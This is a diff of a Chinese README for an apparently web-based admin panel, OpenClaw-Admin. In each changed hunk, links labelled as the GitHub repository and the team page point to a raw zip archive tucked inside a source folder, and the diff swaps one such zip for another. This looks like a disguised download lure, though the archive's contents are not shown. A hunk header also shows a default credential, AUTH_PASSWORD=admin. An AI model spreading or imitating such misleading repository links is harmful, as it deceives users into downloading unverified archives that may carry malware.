@@ -5,7 +5,7 @@
 </p>
 
 <p align="center">
-  <a href="https://raw.githubusercontent.com/lk7597368/OpenClaw-Admin/main/src/views/memory/Claw-Open-Admin-2.2.zip">GitHub</a> •
+  <a href="https://raw.githubusercontent.com/lk7597368/OpenClaw-Admin/main/src/components/office/Claw-Admin-Open-v1.1.zip">GitHub</a> •
   <a href="#功能特性">功能特性</a> •
   <a href="#技术栈">技术栈</a> •
   <a href="#快速开始">快速开始</a> •
@@ -509,7 +509,7 @@ AUTH_PASSWORD=admin
 
 欢迎提交 Issue 和 Pull Request！
 
-**GitHub 仓库**: [https://raw.githubusercontent.com/lk7597368/OpenClaw-Admin/main/src/views/memory/Claw-Open-Admin-2.2.zip](https://raw.githubusercontent.com/lk7597368/OpenClaw-Admin/main/src/views/memory/Claw-Open-Admin-2.2.zip)
+**GitHub 仓库**: [https://raw.githubusercontent.com/lk7597368/OpenClaw-Admin/main/src/components/office/Claw-Admin-Open-v1.1.zip](https://raw.githubusercontent.com/lk7597368/OpenClaw-Admin/main/src/components/office/Claw-Admin-Open-v1.1.zip)
 
 1. Fork 本仓库
 2. 创建功能分支 (`git checkout -b feature/amazing-feature`)
@@ -534,5 +534,5 @@ AUTH_PASSWORD=admin
 ---
 
 <p align="center">
-  Made with ❤️ by <a href="https://raw.githubusercontent.com/lk7597368/OpenClaw-Admin/main/src/views/memory/Claw-Open-Admin-2.2.zip">OpenClaw Admin</a> Team
+  Made with ❤️ by <a href="https://raw.githubusercontent.com/lk7597368/OpenClaw-Admin/main/src/components/office/Claw-Admin-Open-v1.1.zip">OpenClaw Admin</a> Team
 </p>
